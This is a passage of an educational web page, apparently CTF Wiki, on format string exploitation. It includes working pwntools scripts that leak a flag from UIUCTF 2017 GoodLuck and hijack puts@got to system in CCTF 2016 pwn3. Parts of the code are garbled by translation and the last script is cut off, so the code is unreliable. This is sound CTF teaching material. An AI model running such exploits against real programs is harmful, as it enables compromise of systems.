  <a href="#exploiting-ideas" class="md-nav__link">
    <span class="md-ellipsis">
      Exploiting ideas
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vulnerability-program" class="md-nav__link">
    <span class="md-ellipsis">
      Vulnerability Program
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hijack-retaddr" class="md-nav__link">
    <span class="md-ellipsis">
      hijack retaddr
    </span>
  </a>
  
    <nav class="md-nav" aria-label="hijack retaddr">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#principle_2" class="md-nav__link">
    <span class="md-ellipsis">
      Principle
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#examples_2" class="md-nav__link">
    <span class="md-ellipsis">
      Examples
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Examples">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#determining-protection_2" class="md-nav__link">
    <span class="md-ellipsis">
      Determining protection
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    <span class="md-ellipsis">
      分析程序
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-ideas" class="md-nav__link">
    <span class="md-ellipsis">
      Using ideas
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#determining-the-offset_1" class="md-nav__link">
    <span class="md-ellipsis">
      Determining the offset
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#change-address" class="md-nav__link">
    <span class="md-ellipsis">
      Change address
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-the-program_1" class="md-nav__link">
    <span class="md-ellipsis">
      Using the program
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#formatted-string-vulnerability-on-heap" class="md-nav__link">
    <span class="md-ellipsis">
      Formatted string vulnerability on heap
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Formatted string vulnerability on heap">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#principle_3" class="md-nav__link">
    <span class="md-ellipsis">
      Principle
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#examples_3" class="md-nav__link">
    <span class="md-ellipsis">
      Examples
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Examples">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#determining-protection_3" class="md-nav__link">
    <span class="md-ellipsis">
      Determining protection
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    <span class="md-ellipsis">
      分析程序
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-ideas_1" class="md-nav__link">
    <span class="md-ellipsis">
      Using ideas
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-the-relevant-address-and-offset" class="md-nav__link">
    <span class="md-ellipsis">
      Get the relevant address and offset
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#constructing-a-contact-to-get-the-heap-address" class="md-nav__link">
    <span class="md-ellipsis">
      Constructing a contact to get the heap address
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#modify-ebp" class="md-nav__link">
    <span class="md-ellipsis">
      Modify ebp
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-the-shell" class="md-nav__link">
    <span class="md-ellipsis">
      Get the shell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-the-program_2" class="md-nav__link">
    <span class="md-ellipsis">
      Using the program
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#format-string-blind-hit" class="md-nav__link">
    <span class="md-ellipsis">
      Format string blind hit
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Format string blind hit">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#principle_4" class="md-nav__link">
    <span class="md-ellipsis">
      Principle
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#example-1-leaking-stack" class="md-nav__link">
    <span class="md-ellipsis">
      Example 1 - Leaking Stack
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Example 1 - Leaking Stack">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#determine-the-number-of-programs" class="md-nav__link">
    <span class="md-ellipsis">
      Determine the number of programs
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#use" class="md-nav__link">
    <span class="md-ellipsis">
      Use
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#example-2-blind-hijacking-got" class="md-nav__link">
    <span class="md-ellipsis">
      Example 2 - Blind hijacking got
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Example 2 - Blind hijacking got">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#determine-the-number-of-programs_1" class="md-nav__link">
    <span class="md-ellipsis">
      Determine the number of programs
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#determining-the-offset_2" class="md-nav__link">
    <span class="md-ellipsis">
      Determining the offset
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#leaking-binary" class="md-nav__link">
    <span class="md-ellipsis">
      leaking binary
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ary" class="md-nav__link">
    <span class="md-ellipsis">
      分析斌ary
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#title" class="md-nav__link">
    <span class="md-ellipsis">
      Title
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


  
  


<h1 id="format-string-vulnerability-example">Format string vulnerability example<a class="headerlink" href="#format-string-vulnerability-example" title="Permanent link">&para;</a></h1>
<p>The following is a description of some of the formatting vulnerabilities in the CTF. It is also a common use of formatted strings.</p>
<h2 id="64-bit-program-format-string-vulnerability">64-bit program format string vulnerability<a class="headerlink" href="#64-bit-program-format-string-vulnerability" title="Permanent link">&para;</a></h2>
<h3 id="principle">Principle<a class="headerlink" href="#principle" title="Permanent link">&para;</a></h3>
<p>In fact, the 64-bit offset calculation is similar to 32-bit, which is the corresponding parameter. Only the first six parameters of the 64-bit function are stored in the corresponding registers. So in the format string vulnerability? Although we did not put data into the corresponding registers, the program will still parse the format according to the format of the format string.</p>
<h3 id="examples">Examples<a class="headerlink" href="#examples" title="Permanent link">&para;</a></h3>
<p>Here, we introduce the [pwn200 GoodLuck] (<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck</a>) in UIUCTF in 2017 as an example. . Since there is only a local environment, I have set a flag.txt file locally.</p>
<h4 id="determining-protection">Determining protection<a class="headerlink" href="#determining-protection" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code>➜<span class="w">  </span><span class="m">2017</span>-UIUCTF-pwn200-GoodLuck<span class="w"> </span>git:<span class="o">(</span>master<span class="o">)</span><span class="w"> </span>✗<span class="w"> </span>checksec<span class="w"> </span>goodluck

<span class="w">    </span>Arch:<span class="w">     </span>amd64-64-little

<span class="w">    </span>RELRO:<span class="w">    </span>Partial<span class="w"> </span>RELRO

<span class="w">    </span>Stack:<span class="w">    </span>Canary<span class="w"> </span>found

<span class="w">    </span>NX:<span class="w">       </span>NX<span class="w"> </span>enabled

<span class="w">    </span>PIE:<span class="w">      </span>No<span class="w"> </span>PIE<span class="w"> </span><span class="o">(</span>0x400000<span class="o">)</span>
</code></pre></div>
<p>It can be seen that the program has NX protection and partial RELRO protection enabled.</p>
<h4 id="_1">分析程序<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h4>
<p>It can be found that the vulnerability of the program is obvious</p>
<div class="highlight"><pre><span></span><code><span class="w">  </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">21</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">j</span><span class="w"> </span><span class="p">)</span>

<span class="w">  </span><span class="p">{</span>

<span class="n">v5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">format</span><span class="w"> </span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="o">!</span><span class="n">v5</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">v11</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">v5</span><span class="w"> </span><span class="p">)</span>

<span class="w">    </span><span class="p">{</span>

<span class="w">      </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;You answered:&quot;</span><span class="p">);</span>

<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="n">format</span><span class="p">);</span>

<span class="w">      </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">But that was totally wrong lol get rekt&quot;</span><span class="p">);</span>

<span class="w">      </span><span class="n">fflush</span><span class="p">(</span><span class="n">_bss_start</span><span class="p">);</span>

<span class="w">      </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>

<span class="w">      </span><span class="k">goto</span><span class="w"> </span><span class="n">LABEL_11</span><span class="p">;</span>

<span class="w">    </span><span class="p">}</span>

<span class="w">  </span><span class="p">}</span>
</code></pre></div>
<h4 id="determining-the-offset">Determining the offset<a class="headerlink" href="#determining-the-offset" title="Permanent link">&para;</a></h4>
<p>We offset the following at printf, here we only focus on the code part and the stack part.</p>
<div class="highlight"><pre><span></span><code>gef➤<span class="w">  </span>b<span class="w"> </span><span class="nb">printf</span>

Breakpoint<span class="w"> </span><span class="m">1</span><span class="w"> </span>at<span class="w"> </span>0x400640

gef➤<span class="w">  </span>r

Starting<span class="w"> </span>program:<span class="w"> </span>/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/2017-UIUCTF-pwn200-GoodLuck/goodluck<span class="w"> </span>

what<span class="s1">&#39;s the flag</span>

<span class="s1">123456</span>

<span class="s1">You answered:</span>



<span class="s1">Breakpoint 1, __printf (format=0x602830 &quot;123456&quot;) at printf.c:28</span>

<span class="s1">28 printf.c: There is no such file or directory.</span>


<span class="s1">─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────</span>

<span class="s1">   0x7ffff7a627f7 &lt;fprintf+135&gt;    add    rsp, 0xd8</span>

<span class="s1">0x7ffff7a627fe &lt;fprintf+142&gt; right</span>
<span class="s1">   0x7ffff7a627ff                  nop    </span>

<span class="s1"> → 0x7ffff7a62800 &lt;printf+0&gt;       sub    rsp, 0xd8</span>

<span class="s1">0x7ffff7a62807 &lt;printf+7&gt; test al, al</span>
<span class="s1">0x7ffff7a62809 &lt;printf+9&gt; mov QWORD PTR [rsp + 0x28], rsi</span>
<span class="s1">0x7ffff7a6280e &lt;printf+14&gt; mov QWORD PTR [rsp + 0x30], rdx</span>
<span class="s1">───────────────────────────────────────────────────────────────────────[ stack ]────</span>

<span class="s1">[&#39;</span>0x7fffffffdb08<span class="s1">&#39;, &#39;</span>l8<span class="err">&#39;</span><span class="o">]</span>

<span class="m">8</span>

0x00007fffffffdb08│+0x00:<span class="w"> </span>0x0000000000400890<span class="w">  </span>→<span class="w">  </span>&lt;main+234&gt;<span class="w"> </span>mov<span class="w"> </span>edi,<span class="w"> </span>0x4009b8<span class="w">    </span>←<span class="w"> </span><span class="nv">$rsp</span>

0x00007fffffffdb10│+0x08:<span class="w"> </span>0x0000000031000001

0x00007fffffffdb18│+0x10:<span class="w"> </span>0x0000000000602830<span class="w">  </span>→<span class="w">  </span>0x0000363534333231<span class="w"> </span><span class="o">(</span><span class="s2">&quot;123456&quot;</span>?<span class="o">)</span>

0x00007fffffffdb20│<span class="w"> </span>+<span class="w"> </span>0x18:<span class="w"> </span>0x0000000000602010<span class="w"> </span>→<span class="w"> </span><span class="p">&amp;</span>quot<span class="p">;</span>You<span class="w"> </span>answered:<span class="w"> </span><span class="se">\ </span>ng<span class="p">&amp;</span>quot<span class="p">;</span>
0x00007fffffffdb28│+0x20:<span class="w"> </span>0x00007fffffffdb30<span class="w">  </span>→<span class="w">  </span><span class="s2">&quot;flag{11111111111111111&quot;</span>

0x00007fffffffdb30│+0x28:<span class="w"> </span><span class="s2">&quot;flag{11111111111111111&quot;</span>

0x00007fffffffdb38│+0x30:<span class="w"> </span><span class="s2">&quot;11111111111111&quot;</span>

0x00007fffffffdb40│+0x38:<span class="w"> </span>0x0000313131313131<span class="w"> </span><span class="o">(</span><span class="s2">&quot;111111&quot;</span>?<span class="o">)</span>

──────────────────────────────────────────────────────────────────────────────<span class="o">[</span><span class="w"> </span>trace<span class="w"> </span><span class="o">]</span>────

<span class="o">[</span><span class="c1">#0] 0x7ffff7a62800 → Name: __printf(format=0x602830 &quot;123456&quot;)</span>

<span class="o">[</span><span class="c1">#1] 0x400890 → Name: main()</span>

─────────────────────────────────────────────────────────────────────────────────────────────────
</code></pre></div>
<p>It can be seen that the offset on the stack corresponding to the flag is 5, and the offset is 4 except for the corresponding first behavior return address. In addition, since this is a 64-bit program, the first 6 parameters exist in the corresponding registers, and the fmt string is stored in the RDI register, so the offset of the address corresponding to the fmt string is 10. The order corresponding to <code>%order$s</code> in the fmt string is the order of the arguments after the fmt string, so we only need to type <code>%9$s</code> to get the contents of the flag. Of course, we have an easier way to use fmtarg in <a href="https://github.com/scwuaptx/Pwngdb">https://github.com/scwuaptx/Pwngdb</a> to determine the offset of a parameter.</p>
<div class="highlight"><pre><span></span><code>gef➤<span class="w">  </span>fmtarg<span class="w"> </span>0x00007fffffffdb28

The<span class="w"> </span>index<span class="w"> </span>of<span class="w"> </span>format<span class="w"> </span>argument<span class="w"> </span>:<span class="w"> </span><span class="m">10</span>
</code></pre></div>
<p>Note that we have to break at printf.</p>
<h4 id="using-the-program">Using the program<a class="headerlink" href="#using-the-program" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>

<span class="kn">from</span><span class="w"> </span><span class="nn">LibcSearcher</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>

<span class="n">goodluck</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./goodluck&#39;</span><span class="p">)</span>

<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>

    <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.sniperoj.cn&#39;</span><span class="p">,</span> <span class="mi">30017</span><span class="p">)</span>

<span class="k">else</span><span class="p">:</span>

    <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./goodluck&#39;</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;%9$s&quot;</span>

<span class="nb">print</span> <span class="n">payload</span>

<span class="c1">##gdb.attach(sh)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="nb">print</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
<h2 id="hijack-got">hijack GOT<a class="headerlink" href="#hijack-got" title="Permanent link">&para;</a></h2>
<h3 id="principle_1">Principle<a class="headerlink" href="#principle_1" title="Permanent link">&para;</a></h3>
<p>In the current C program, the functions in libc are all jumped through the GOT table. In addition, the GOT entry corresponding to each libc function can be modified without enabling RELRO protection. Therefore, we can modify the GOT table content of one libc function to the address of another libc function to achieve control of the program. For example, we can modify the contents of the got item of printf to the address of the system function. Thus, the program actually executes the system function when it executes printf.</p>
<p>Suppose we override the address of function A as the address of function B, then this attack technique can be divided into the following steps.</p>
<ul>
<li>
<p>Determine the GOT table address of function A.</p>
</li>
<li>
<p>The function A we used in this step is usually in the program, so we can find it by simply finding the address.</p>
</li>
<li>
<p>Determine the memory address of function B</p>
</li>
<li>
<p>This step usually requires us to find a way to leak the address of the corresponding function B.</p>
</li>
<li>
<p>Write the memory address of function B to the GOT table address of function A.</p>
</li>
<li>
<p>This step generally requires us to use the vulnerability of the function to trigger. The general use methods are as follows</p>
</li>
<li>
<p>Write function: write function.</p>
</li>
<li>
<p>ROP</p>
<div class="codehilite"><pre><span></span><code>```text

pop eax; ret;           # printf@got -&gt; eax

pop ebx; ret;           # (addr_offset = system_addr - printf_addr) -&gt; ebx

add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset

```
</code></pre></div>

</li>
<li>
<p>Format string to write at any address</p>
</li>
</ul>
<h3 id="examples_1">Examples<a class="headerlink" href="#examples_1" title="Permanent link">&para;</a></h3>
<p>Here we take [pwn3] (<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2016-CCTF-pwn3">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2016-CCTF-pwn3</a>) in the 2016 CCTF as an example.</p>
<h4 id="determining-protection_1">Determining protection<a class="headerlink" href="#determining-protection_1" title="Permanent link">&para;</a></h4>
<p>as follows</p>
<div class="highlight"><pre><span></span><code>➜<span class="w">  </span><span class="m">2016</span>-CCTF-pwn3<span class="w"> </span>git:<span class="o">(</span>master<span class="o">)</span><span class="w"> </span>✗<span class="w"> </span>checksec<span class="w"> </span>pwn3<span class="w"> </span>

<span class="w">    </span>Arch:<span class="w">     </span>i386-32-little

<span class="w">    </span>RELRO:<span class="w">    </span>Partial<span class="w"> </span>RELRO

<span class="w">    </span>Stack:<span class="w">    </span>No<span class="w"> </span>canary<span class="w"> </span>found

<span class="w">    </span>NX:<span class="w">       </span>NX<span class="w"> </span>enabled

<span class="w">    </span>PIE:<span class="w">      </span>No<span class="w"> </span>PIE<span class="w"> </span><span class="o">(</span>0x8048000<span class="o">)</span>
</code></pre></div>
<p>It can be seen that the program mainly turns on NX protection. We generally turn on ASLR protection by default.</p>
<h4 id="_2">分析程序<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h4>
<p>First analyze the program, you can find that the program seems to mainly implement a password-registered ftp, with three basic functions: get, put, dir. Probably look at the code for each feature and find a format string vulnerability in the get function.</p>
<div class="highlight"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="nf">get_file</span><span class="p">()</span>

<span class="p">{</span>

<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">dest</span><span class="p">;</span><span class="w"> </span><span class="c1">// [sp+1Ch] [bp-FCh]@5</span>

<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">s1</span><span class="p">;</span><span class="w"> </span><span class="c1">// [sp+E4h] [bp-34h]@1</span>

<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">i</span><span class="p">;</span><span class="w"> </span><span class="c1">// [sp+10Ch] [bp-Ch]@3</span>



<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;enter the file name you want to get:&quot;</span><span class="p">);</span>

<span class="w">  </span><span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot;%40s&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">s1</span><span class="p">);</span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="o">!</span><span class="n">strncmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;flag&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">4u</span><span class="p">)</span><span class="w"> </span><span class="p">)</span>

<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;too young, too simple&quot;</span><span class="p">);</span>

<span class="w">  </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">file_head</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">60</span><span class="p">)</span><span class="w"> </span><span class="p">)</span>

<span class="w">  </span><span class="p">{</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">s1</span><span class="p">)</span><span class="w"> </span><span class="p">)</span>

<span class="w">    </span><span class="p">{</span>

<span class="n">strcpy</span><span class="w"> </span><span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="w"> </span><span class="n">dest</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x28</span><span class="p">);</span>
<span class="k">return</span><span class="w"> </span><span class="n">printf</span><span class="w"> </span><span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="w"> </span><span class="n">dest</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">  </span><span class="p">}</span>

<span class="k">return</span><span class="w"> </span><span class="n">printf</span><span class="w"> </span><span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="w"> </span><span class="n">dest</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
<h4 id="exploiting-ideas">Exploiting ideas<a class="headerlink" href="#exploiting-ideas" title="Permanent link">&para;</a></h4>
<p>Since there is a format string vulnerability, we can determine the following ideas</p>
<ul>
<li>Bypass password</li>
<li>Determine formatting string parameter offset</li>
<li>Use put@got to get the put function address, and then get the corresponding version of libc.so, and then get the corresponding system function address.</li>
<li>Modify the contents of puts@got to the address of system.</li>
<li>When the program executes the puts function again, it actually executes the system function.</li>
</ul>
<h4 id="vulnerability-program">Vulnerability Program<a class="headerlink" href="#vulnerability-program" title="Permanent link">&para;</a></h4>
<p>as follows</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>

<span class="kn">from</span><span class="w"> </span><span class="nn">LibcSearcher</span><span class="w"> </span><span class="kn">import</span> <span class="n">LibcSearcher</span>

<span class="c1">##context.log_level = &#39;debug&#39;</span>

<span class="n">pwn3</span> <span class="o">=</span> <span class="n">ELF</span> <span class="p">(</span><span class="o">&amp;</span><span class="c1">#39;./pwn3&amp;#39;)</span>
<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>

    <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;111&#39;</span><span class="p">,</span> <span class="mi">111</span><span class="p">)</span>

<span class="k">else</span><span class="p">:</span>

    <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn3&#39;</span><span class="p">)</span>





<span class="k">def</span><span class="w"> </span><span class="nf">get</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;get&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;enter the file name you want to get:&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>

    <span class="n">data</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

    <span class="k">return</span> <span class="n">data</span>





<span class="k">def</span><span class="w"> </span><span class="nf">put</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;put&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;please enter the name of the file you want to upload:&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;then, enter the content:&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>





<span class="k">def</span><span class="w"> </span><span class="nf">show_dir</span><span class="p">():</span>

<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span> <span class="o">&amp;</span><span class="c1">#39;you&amp;#39;)</span>




<span class="n">tmp</span> <span class="o">=</span> <span class="s1">&#39;sysbdmin&#39;</span>

<span class="n">name</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tmp</span><span class="p">:</span>

    <span class="n">name</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>





<span class="c1">## password</span>

<span class="k">def</span><span class="w"> </span><span class="nf">password</span><span class="p">():</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Name (ftp.hacker.server:Rainism):&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>





<span class="c1">##password</span>

<span class="n">password</span><span class="p">()</span>

<span class="c1">## get the addr of puts</span>
<span class="n">puts_got</span> <span class="o">=</span> <span class="n">pwn3</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>

<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;puts got : &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_got</span><span class="p">))</span>

<span class="n">put</span><span class="p">(</span><span class="s1">&#39;1111&#39;</span><span class="p">,</span> <span class="s1">&#39;%8$s&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">))</span>

<span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;1111&#39;</span><span class="p">)[:</span><span class="mi">4</span><span class="p">])</span>



<span class="c1">## get addr of system</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s2">&quot;puts&quot;</span><span class="p">,</span> <span class="n">puts_addr</span><span class="p">)</span>

<span class="n">system_offset</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>

<span class="n">puts_offset</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">)</span>

<span class="n">system_addr</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">puts_offset</span> <span class="o">+</span> <span class="n">system_offset</span>

<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;system addr : &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>



<span class="c1">## modify puts@got, point to system_addr</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="p">{</span><span class="n">puts_got</span><span class="p">:</span> <span class="n">system_addr</span><span class="p">})</span>

<span class="n">put</span><span class="p">(</span><span class="s1">&#39;/bin/sh;&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;ftp&gt;&#39;</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;get&#39;</span><span class="p">)</span>

